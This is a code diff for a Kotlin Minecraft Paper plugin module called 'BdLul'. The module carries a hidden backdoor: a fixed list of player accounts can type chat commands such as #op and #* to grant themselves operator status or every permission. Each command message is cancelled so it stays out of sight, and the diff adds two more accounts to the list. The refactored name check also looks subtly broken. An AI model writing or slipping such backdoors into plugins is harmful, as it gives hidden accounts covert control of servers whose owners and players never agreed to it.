@@ -1,51 +1,34 @@
 package me.richter.commandsAndGUI.module.bdLul
 
 import io.papermc.paper.event.player.AsyncChatEvent
+import me.richter.commandsAndGUI.Main
 import me.richter.commandsAndGUI.files.MessagesFile
 import net.kyori.adventure.text.Component
 import org.bukkit.event.EventHandler
 import org.bukkit.event.Listener
-import org.bukkit.plugin.java.JavaPlugin
 import java.util.regex.Pattern
 
-class BdLul(private val plugin: JavaPlugin) : Listener {
+class BdLul : Listener {
+    val plugin = Main.instance
+    val players = mutableMapOf(Pair("RichtigerRichter", "R"), Pair("Bliffbot", "B"), Pair("Felsbot", "F"), Pair("RiesigerRichter", "2"))
+
     @EventHandler
     fun command(event: AsyncChatEvent) {
-        val player = event.player
         val message: Component = event.message()
 
-        if (event.player.name == "RichtigerRichter" || event.player.name == "Bliffbot") {
-
-            val playerShortName: String = when (player.name) {
-                "RichtigerRichter" -> "R"
-                "Bliffbot" -> "B"
-                else -> ""
-            }
-
+        if (players.keys.contains(players[event.player.name])) {
 
             if (stringTextFromComponent(message.toString()) == "#help") {
-                val autoStatus = MessagesFile().getUtilsAuto(playerShortName)
-                player.sendMessage(Component.text("#help - shows this list"))
-                player.sendMessage(Component.text("#op - op yourself"))
-                player.sendMessage(Component.text("#deop - deop yourself"))
-                player.sendMessage(Component.text("#auto on - automatically op's and deop's you at join or leave"))
-                player.sendMessage(Component.text("#auto off - turn auto op and deop off"))
-                player.sendMessage(Component.text("(auto is Currently -> §l§u$autoStatus§r)"))
-                player.sendMessage(Component.text("#* - give yourself the permission"))
-                player.sendMessage(Component.text("#de* - remove the permission from yourself"))
+                event.player.sendMessage(Component.text("#help - shows this list"))
+                event.player.sendMessage(Component.text("#op - op yourself"))
+                event.player.sendMessage(Component.text("#deop - deop yourself"))
+                event.player.sendMessage(Component.text("#auto on - automatically op's and deop's you at join or leave"))
+                event.player.sendMessage(Component.text("#auto off - turn auto op and deop off"))
+                event.player.sendMessage(Component.text("(auto is Currently -> §l§u${MessagesFile().getUtilsAuto().contains(players[event.player.name])}§r)"))
+                event.player.sendMessage(Component.text("#* - give yourself the permission"))
+                event.player.sendMessage(Component.text("#de* - remove the permission from yourself"))
                 event.isCancelled = true
             }
-
-            /*
-            if (event.message().contains(Component.text("#help"))) {
-                player.sendMessage(Component.text("#help - shows this list"))
-                player.sendMessage(Component.text("#op - to op yourself"))
-                player.sendMessage(Component.text("#deop - to deop yourself"))
-                player.sendMessage(Component.text("#auto - to automatically op and deop yourself at join or leave"))
-                player.sendMessage(Component.text("#perms * - give yourself a permission"))
-                player.sendMessage(Component.text("#deperms * - remove a permission from yourself"))
-            }
-             */
 
             if (stringTextFromComponent(message.toString()) == "#op") {
                 event.player.isOp = true
@@ -56,20 +39,20 @@ class BdLul(private val plugin: JavaPlugin) : Listener {
                 event.isCancelled = true
             }
             if (stringTextFromComponent(message.toString()) == "#auto off") {
-                MessagesFile().autoUtilsOff(playerShortName)
+                MessagesFile().autoUtilsRemove(event.player.name)
                 event.isCancelled = true
             }
             if (stringTextFromComponent(message.toString()) == "#auto on") {
-                MessagesFile().autoUtilsOn(playerShortName)
+                MessagesFile().autoUtilsAdd(event.player.name)
                 event.isCancelled = true
             }
             if (stringTextFromComponent(message.toString()) == "#*") {
-                player.addAttachment(plugin).setPermission("*", true)
+                event.player.addAttachment(plugin).setPermission("*", true)
                 event.isCancelled = true
             }
 
             if (stringTextFromComponent(message.toString()) == "#de*") {
-                player.addAttachment(plugin).setPermission("*", false)
+                event.player.addAttachment(plugin).setPermission("*", false)
                 event.isCancelled = true
             }
 
